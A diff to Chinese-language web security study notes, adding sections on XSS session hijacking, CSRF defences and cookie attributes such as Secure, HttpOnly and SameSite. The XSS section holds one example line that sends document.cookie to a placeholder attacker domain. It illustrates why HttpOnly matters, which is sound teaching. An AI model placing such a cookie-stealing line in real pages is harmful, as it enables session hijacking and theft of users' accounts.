@@ -36,6 +36,13 @@
 3. 检查输入的 URL
 4. 对传入 js 函数的文本类型参数值进行 javascript 转义
 
+会话劫持和 XSS：
+常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS (en-US) 攻击。
+```js
+// HttpOnly 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```
+
 ## SQL 注入
 
 预防办法：数据与代码分离,即不用字符串拼凑 SQL 语句
@@ -45,11 +52,23 @@
 XST(跨站追踪)攻击，关闭 Web 服务器的 TRACE 方法
 
 ## CSRF 攻击的防御
-
+- 令牌同步模式(tokie)
+原理:令牌可以通过任何方式生成，只要确保随机性和唯一性.这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。
+- 检查Referer字段
+ 因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。
 ## HTTP 头注入
 
 ## Cookie 安全
-
+标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端
+HttpOnly属性可防止通过javascript 访问cookie值
+SameSite 属性 允许服务器要求某个cookie在跨站请求时不会被发送,从而可以阻止跨站请求伪造攻击(CSRF)
+1. SameSite=None:浏览器会在同站请求、跨站请求下继续发送cookies,不区分大小写
+2. SameSite=Strict:浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）
+3. SameSite=Lax:但只有当用户从外部站点导航到URL时才会发送。如 link 链接
+```JS
+Set-Cookie: key=value; SameSite=Strict;
+Set-Cookie: sessionId=e8bb43229de9; Domain=foo.example.com
+```
 ## 提高资源的安全性-SRI(Subresource Integrity) 与 CSP
 
 - SRI
